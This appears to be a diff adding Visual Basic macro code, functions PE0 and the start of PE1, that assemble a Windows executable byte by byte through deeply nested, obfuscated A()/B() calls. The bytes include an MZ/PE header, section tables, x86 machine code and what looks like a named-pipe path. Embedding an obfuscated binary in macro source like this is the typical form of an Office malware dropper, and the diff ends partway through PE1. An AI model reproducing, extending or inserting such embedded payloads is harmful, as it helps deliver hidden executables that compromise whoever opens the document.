+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 4), 0), 0), 0), 0), 0), 0), 0), 0), 144), 0), 0), 0), 4), 0), 0), 196), 238), 0), 0), 2), 0), "@"), 1), 0), 0), " "), 0), 0), 16), 0), 0), 0), 0), 16), 0), 0), 16), 0), 0), 0), 0), 0), 0), 16), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), "`"), 0), 0), 28), 6), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "L@"), 0), 0), 24), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 24), "a"), 0), 0), 220), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), ".text"), 0), 0), 0), 132), 25), 0), 0), 0), 16), 0), 0), 0), 26), 0), 0), 0), 4), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "`"), 0), "P`.data"), 0), 0), 0), "L"), 4), 0), 0), 0), "0"), 0), 0), 0), 6), 0), 0), 0), 30), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 0), 0), "@"), 0), "`"), 192), ".rdata"), 0), 0), "0"), 6), 0), 0), 0), "@"), 0), 0), 0), 8), 0), 0), 0), "$"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "0@.bss")
+    strPE = B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "("), 4), 0), 0), 0), "P"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 0), "`"), 192), ".idata"), 0), 0), 28), 6), 0), 0), 0), "`")
+    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 0), 8), 0), 0), 0), ","), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "0"), 192), ".CRT"), 0), 0), 0), 0), "4"), 0), 0), 0), 0), "p"), 0), 0), 0), 2), 0), 0), 0), "4"), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "0"), 192), ".tls"), 0), 0), 0), 0), 8), 0), 0), 0), 0), 128), 0), 0), 0), 2), 0), 0), 0), "6"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "@"), 0), "0"), 192), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 243), 195), 141), 180), "&"), 0), 0), 0), 0), 141), 180), "&"), 0), 0), 0), 0), 131), 236), 28), "1"), 192), "f"), 129), "="), 0), 0)
+    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "@"), 0), "MZ"), 199), 5), 140), "S@"), 0), 1), 0), 0), 0), 199), 5), 136), "S@"), 0), 1), 0), 0), 0), 199), 5), 132), "S@"), 0), 1), 0), 0), 0), 199), 5), "(P@"), 0), 1), 0), 0), 0), "tI"), 163), 12), "P@")
+    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 0), 161), 152), "S@"), 0), 133), 192), "t-"), 199), 4), "$"), 2), 0), 0), 0), 232), 26), 24), 0), 0), 232), 29), 24), 0), 0), 139), 21), 168), "S@"), 0), 137), 16), 232), 172), 8), 0), 0), 131), "=44@"), 0), 1), "tc1")
+    strPE = A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 192), 131), 196), 28), 195), 199), 4), "$"), 1), 0), 0), 0), 232), 237), 23), 0), 0), 235), 209), 139), 21), "<"), 0), "@"), 0), 129), 186), 0), 0), "@"), 0), "PE"), 0), 0), 141), 138), 0), 0), "@"), 0), "u"), 159), 15), 183), "Q"), 24), "f"), 129), 250)
+    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 11), 1), "t>f"), 129), 250), 11), 2), "u"), 141), 131), 185), 132), 0), 0), 0), 14), "v"), 132), 139), 145), 248), 0), 0), 0), "1"), 192), 133), 210), 15), 149), 192), 233), "r"), 255), 255), 255), 141), 180), "&"), 0), 0), 0), 0), 141), "v"), 0), 199), 4)
+    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "$"), 192), 27), "@"), 0), 232), 196), 10), 0), 0), "1"), 192), 131), 196), 28), 195), 131), "yt"), 14), 15), 134), "L"), 255), 255), 255), 139), 137), 232), 0), 0), 0), "1"), 192), 133), 201), 15), 149), 192), 233), ":"), 255), 255), 255), "f"), 144), 131), 236), ","), 161)
+    strPE = A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 128), "S@"), 0), 199), "D$"), 16), 4), "P@"), 0), 199), "D$"), 8), 20), "P@"), 0), 199), "D$"), 4), 24), "P@"), 0), 199), 4), "$"), 28), "P@"), 0), 163), 4), "P@"), 0), 161), "$P@"), 0), 137), "D$"), 12), 232)
+    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(strPE, "J"), 23), 0), 0), 131), 196), ","), 195), "f"), 144), 141), "L$"), 4), 131), 228), 240), "1"), 192), 255), "q"), 252), "U"), 137), 229), "WVSQ"), 141), "U"), 164), 185), 17), 0), 0), 0), 131), 236), "x"), 139), "5"), 152), "S@"), 0), 137), 215), 243), 171)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 133), 246), 15), 133), 176), 2), 0), 0), "d"), 161), 24), 0), 0), 0), "1"), 219), 139), "x"), 4), 139), "5la@"), 0), 235), 20), "9"), 199), 15), 132), "5"), 2), 0), 0), 199), 4), "$"), 232), 3), 0), 0), 255), 214), 131), 236), 4), 137), 216), 240)
+    strPE = A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 15), 177), "= T@"), 0), 133), 192), "u"), 222), 161), "$T@"), 0), "1"), 219), 131), 248), 1), 15), 132), 30), 2), 0), 0), 161), "$T@"), 0), 133), 192), 15), 132), "o"), 2), 0), 0), 199), 5), 8), "P@"), 0), 1), 0), 0), 0)
+    strPE = B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 161), "$T@"), 0), 131), 248), 1), 15), 132), 19), 2), 0), 0), 133), 219), 15), 132), "1"), 2), 0), 0), 161), "H@@"), 0), 133), 192), "t"), 28), 199), "D$"), 8), 0), 0), 0), 0), 199), "D$"), 4), 2), 0), 0), 0), 199), 4), "$")
+    strPE = A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 255), 208), 131), 236), 12), 232), 164), 11), 0), 0), 199), 4), "$@ @"), 0), 255), 21), "ha@"), 0), 131), 236), 4), 163), 172), "S@"), 0), 199), 4), "$"), 0), 16), "@"), 0), 232), 131), 22), 0), 0), 232), 254), 9)
+    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 199), 5), 220), "S@"), 0), 0), 0), "@"), 0), 232), ";"), 22), 0), 0), 139), 0), "1"), 201), 133), 192), "u"), 24), 235), "Y"), 141), "t&"), 0), 144), 132), 210), "t,"), 131), 225), 1), "t'"), 185), 1), 0), 0), 0), 131), 192), 1), 15)
+    strPE = A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 182), 16), 128), 250), " ~"), 231), 137), 203), 131), 243), 1), 128), 250), 34), 15), "D"), 203), 235), 232), 141), 180), "&"), 0), 0), 0), 0), 141), "v"), 0), 132), 210), "u"), 17), 235), 25), 141), 180), "&"), 0), 0), 0), 0), 141), "v"), 0), 128), 250), " "), 127)
+    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 10), 131), 192), 1), 15), 182), 16), 132), 210), "u"), 241), 163), 216), "S@"), 0), 139), 29), 152), "S@"), 0), 133), 219), "t"), 20), 246), "E"), 208), 1), 184), 10), 0), 0), 0), 15), 133), 243), 0), 0), 0), 163), 0), "0@"), 0), 139), 29), 28), "P")
+    strPE = A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "@"), 0), 141), "4"), 157), 4), 0), 0), 0), 137), "4$"), 232), "5"), 21), 0), 0), 133), 219), 137), "E"), 144), 139), 21), 24), "P@"), 0), 15), 142), "l"), 1), 0), 0), 137), 195), 141), "F"), 252), 137), 215), 137), "E"), 140), 1), 208), 137), "E"), 148), 141)
+    strPE = B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 180), "&"), 0), 0), 0), 0), "f"), 144), 139), 7), 131), 195), 4), 131), 199), 4), 137), 4), "$"), 232), 220), 20), 0), 0), 141), "p"), 1), 137), "4$"), 232), 241), 20), 0), 0), 137), "C"), 252), 139), "O"), 252), 137), "t$"), 8), 137), 4), "$"), 137), "L")
+    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "$"), 4), 232), 211), 20), 0), 0), "9}"), 148), "u"), 202), 139), "E"), 140), 3), "E"), 144), 199), 0), 0), 0), 0), 0), 139), "E"), 144), 163), 24), "P@"), 0), 232), 145), 5), 0), 0), 161), 144), "a@"), 0), 139), 21), 20), "P@"), 0), 137), 16)
+    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 161), 20), "P@"), 0), 137), "D$"), 8), 161), 24), "P@"), 0), 137), "D$"), 4), 161), 28), "P@"), 0), 137), 4), "$"), 232), "E"), 21), 0), 0), 139), 13), 12), "P@"), 0), 163), 16), "P@"), 0), 133), 201), 15), 132), 206), 0), 0), 0)
+    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 139), 21), 8), "P@"), 0), 133), 210), "u"), 10), 232), 183), 20), 0), 0), 161), 16), "P@"), 0), 141), "e"), 240), "Y[^_]"), 141), "a"), 252), 195), "f"), 144), 15), 183), "E"), 212), 233), 4), 255), 255), 255), 141), 180), "&"), 0), 0), 0), 0)
+    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 161), "$T@"), 0), 187), 1), 0), 0), 0), 131), 248), 1), 15), 133), 226), 253), 255), 255), 199), 4), "$"), 31), 0), 0), 0), 232), "}"), 20), 0), 0), 161), "$T@"), 0), 131), 248), 1), 15), 133), 237), 253), 255), 255), 199), "D$"), 4), 8)
+    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(strPE, "p@"), 0), 199), 4), "$"), 0), "p@"), 0), 232), "K"), 20), 0), 0), 133), 219), 199), 5), "$T@"), 0), 2), 0), 0), 0), 15), 133), 207), 253), 255), 255), 135), 29), " T@"), 0), 233), 196), 253), 255), 255), "f"), 144), 137), 20), "$"), 255)
+    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(strPE, 21), "Da@"), 0), 131), 236), 4), 233), "?"), 253), 255), 255), 199), "D$"), 4), 24), "p@"), 0), 199), 4), "$"), 12), "p@"), 0), 199), 5), "$T@"), 0), 1), 0), 0), 0), 232), 253), 19), 0), 0), 233), "x"), 253), 255), 255), 139), "E")
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 144), 233), 224), 254), 255), 255), 137), 4), "$"), 232), 200), 19), 0), 0), 141), 180), "&"), 0), 0), 0), 0), 141), "t&"), 0), 144), 131), 236), 12), 199), 5), 152), "S@"), 0), 1), 0), 0), 0), 232), 158), 4), 0), 0), 131), 196), 12), 233), 182), 252)
+    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 141), 182), 0), 0), 0), 0), 131), 236), 12), 199), 5), 152), "S@"), 0), 0), 0), 0), 0), 232), "~"), 4), 0), 0), 131), 196), 12), 233), 150), 252), 255), 255), 141), 182), 0), 0), 0), 0), 131), 236), 28), 139), "D$ "), 137), 4), "$")
+    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 232), 133), 19), 0), 0), 133), 192), 15), 148), 192), 131), 196), 28), 15), 182), 192), 247), 216), 195), 144), 144), 144), "U"), 137), 229), 131), 236), 24), 199), 4), "$"), 0), 21), "@"), 0), 232), 206), 255), 255), 255), 201), 195), 141), 180), "&"), 0), 0), 0), 0), 141)
+    strPE = B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "t&"), 0), 144), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "U"), 137), 229), 139), "E"), 8), "]"), 255), 224), "U"), 137), 229), "VS"), 131), 236), " "), 139), "]"), 12), 199), "D$"), 8), 0), 0), 0), 0), 199), "D")
+    strPE = A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "$"), 4), 0), 0), 0), 0), 199), 4), "$"), 0), 0), 4), 0), 255), 21), "Ta@"), 0), 131), 236), 12), 137), "\$"), 8), 199), "D$"), 4), 0), 0), 0), 0), 137), 4), "$"), 255), 21), "Pa@"), 0), "1"), 210), 131), 236), 12), "9"), 218)
+    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "}"), 23), 137), 209), 139), "u"), 16), 131), 225), 3), 138), 12), 14), 139), "u"), 8), "2"), 12), 22), 136), 12), 16), "B"), 235), 229), 199), "D$"), 20), 0), 0), 0), 0), 199), "D$"), 16), 0), 0), 0), 0), 137), "D$"), 12), 199), "D$"), 8), 16)
+
+    PE0 = strPE
+End Function
+
+Private Function PE1() As String
+   Dim strPE As String
+
+    strPE = ""
+    strPE = A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 21), "@"), 0), 199), "D$"), 4), 0), 0), 0), 0), 199), 4), "$"), 0), 0), 0), 0), 255), 21), "(a@"), 0), 131), 236), 24), 141), "e"), 248), "[^]"), 195), "U"), 137), 229), "WVS"), 131), 236), "<"), 139), "}"), 8), 139), "u"), 12), 199)
+    strPE = A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "E"), 228), 0), 0), 0), 0), 199), "D$"), 28), 0), 0), 0), 0), 199), "D$"), 24), 0), 0), 0), 0), 199), "D$"), 20), 0), 0), 0), 0), 199), "D$"), 16), 0), 0), 0), 0), 199), "D$"), 12), 1), 0), 0), 0), 199), "D$"), 8)
+    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 199), "D$"), 4), 2), 0), 0), 0), 199), 4), "$"), 224), "S@"), 0), 255), 21), "$a@"), 0), 137), 195), "H"), 131), 236), " "), 131), 248), 253), "wW"), 199), "D$"), 4), 0), 0), 0), 0), 137), 28), "$"), 255), 21), 28)
+    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(strPE, "a@"), 0), "RR"), 133), 192), "t@"), 133), 246), "~'"), 141), "E"), 228), 199), "D$"), 16), 0), 0), 0), 0), 137), "D$"), 12), 137), "t$"), 8), 137), "|$"), 4), 137), 28), "$"), 255), 21), 132), "a@"), 0), 131), 236), 20), 133), 192)
+    strPE = A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "u"), 12), 137), 28), "$"), 255), 21), 24), "a@"), 0), "P"), 235), 9), 139), "E"), 228), 1), 199), ")"), 198), 235), 192), 141), "e"), 244), "[^_]"), 195), "U"), 137), 229), 131), 236), 24), 161), "$0@"), 0), 199), 4), "$00@"), 0), 137)
+    strPE = A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(strPE, "D$"), 4), 232), " "), 255), 255), 255), "1"), 192), 201), 195), "U"), 137), 229), "WVS"), 131), 236), "<"), 139), "}"), 8), 139), "]"), 12), 199), "E"), 228), 0), 0), 0), 0), 199), "D$"), 24), 0), 0), 0), 0), 199), "D$"), 20), 128), 0), 0), 0)
+    strPE = A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 199), "D$"), 16), 3), 0), 0), 0), 199), "D$"), 12), 0), 0), 0), 0), 199), "D$"), 8), 3), 0), 0), 0), 199), "D$"), 4), 0), 0), 0), 128), 199), 4), "$"), 224), "S@"), 0), 255), 21), " a@"), 0), 137), 198), 131), 236), 28)
+    strPE = A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "1"), 192), 131), 254), 255), "tE"), 133), 219), "~'"), 141), "E"), 228), 199), "D$"), 16), 0), 0), 0), 0), 137), "D$"), 12), 137), "\$"), 8), 137), "|$"), 4), 137), "4$"), 255), 21), "da@"), 0), 131), 236), 20), 133), 192), "u"), 17)
+    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(strPE, 137), "4$"), 255), 21), 24), "a@"), 0), "P"), 184), 1), 0), 0), 0), 235), 9), 139), "E"), 228), 1), 199), ")"), 195), 235), 187), 141), "e"), 244), "[^_]"), 195), "U"), 137), 229), "S"), 131), 236), 20), 161), "$0@"), 0), 137), 4), "$"), 232)
+    strPE = A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 196), 16), 0), 0), 137), 195), 199), 4), "$"), 0), 4), 0), 0), 255), 21), "la@"), 0), "P"), 161), "$0@"), 0), 137), 28), "$"), 137), "D$"), 4), 232), 31), 255), 255), 255), 133), 192), "t"), 221), 161), "$0@"), 0), 137), 28), "$"), 199)
+    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "D$"), 8), "(0@"), 0), 137), "D$"), 4), 232), 131), 253), 255), 255), "1"), 192), 139), "]"), 252), 201), 195), "U"), 137), 229), 131), 236), "8"), 255), 21), "La@"), 0), 185), 170), "&"), 0), 0), "1"), 210), 199), "D$(\"), 0), 0), 0)
+    strPE = A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 247), 241), 199), "D$$e"), 0), 0), 0), 199), "D$ p"), 0), 0), 0), 199), "D$"), 28), "i"), 0), 0), 0), 199), "D$"), 24), "p"), 0), 0), 0), 199), "D$"), 20), "\"), 0), 0), 0), 199), "D$"), 16), "."), 0), 0), 0)
+    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 199), "D$"), 12), "\"), 0), 0), 0), 199), "D$"), 8), "\"), 0), 0), 0), 199), "D$"), 4), 0), "@@"), 0), 199), 4), "$"), 224), "S@"), 0), 137), "T$,"), 232), 242), 15), 0), 0), 199), "D$"), 20), 0), 0), 0), 0), 199), "D")
+    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "$"), 16), 0), 0), 0), 0), 199), "D$"), 12), 0), 0), 0), 0), 199), "D$"), 8), "y"), 22), "@"), 0), 199), "D$"), 4), 0), 0), 0), 0), 199), 4), "$"), 0), 0), 0), 0), 255), 21), "(a@"), 0), 199), "E"), 8), 0), 0), 0), 0)
